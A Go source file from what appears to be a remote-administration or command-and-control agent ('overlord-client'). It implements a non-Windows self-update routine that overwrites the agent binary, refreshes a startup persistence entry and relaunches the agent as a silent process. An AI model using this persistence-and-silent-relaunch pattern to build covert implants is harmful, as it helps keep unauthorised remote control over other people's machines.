//go:build !windows
// +build !windows

package handlers

import (
	"fmt"
	"os"
	"path/filepath"

	"overlord-client/cmd/agent/persistence"
)

func samePathByOS(left string, right string) bool {
	return filepath.Clean(left) == filepath.Clean(right)
}

func runAgentUpdate(sourcePath string, enablePersistence bool) error {
	currentExe, currentErr := resolveCurrentExecutableOnDisk()
	startupPath, startupEnabled, err := startupTargetPath(enablePersistence)
	if err != nil {
		return err
	}

	if currentErr != nil && !startupEnabled {
		return currentErr
	}

	restartPath := currentExe
	if startupEnabled {
		restartPath = startupPath
	}
	if restartPath == "" {
		return fmt.Errorf("no restart path available for update")
	}

	if startupEnabled {
		if err := copyExecutableAtomic(sourcePath, startupPath); err != nil {
			return err
		}
		if err := persistence.Configure(startupPath); err != nil {
			return fmt.Errorf("failed to refresh startup entry: %w", err)
		}
	}

	if currentErr == nil && !samePath(currentExe, restartPath) {
		if err := copyExecutableAtomic(sourcePath, currentExe); err != nil {
			return err
		}
	}
	_ = os.Remove(sourcePath)

	if err := startSilentProcess(restartPath, nil, "", true); err != nil {
		return fmt.Errorf("failed to launch updated agent: %w", err)
	}
	return nil
}
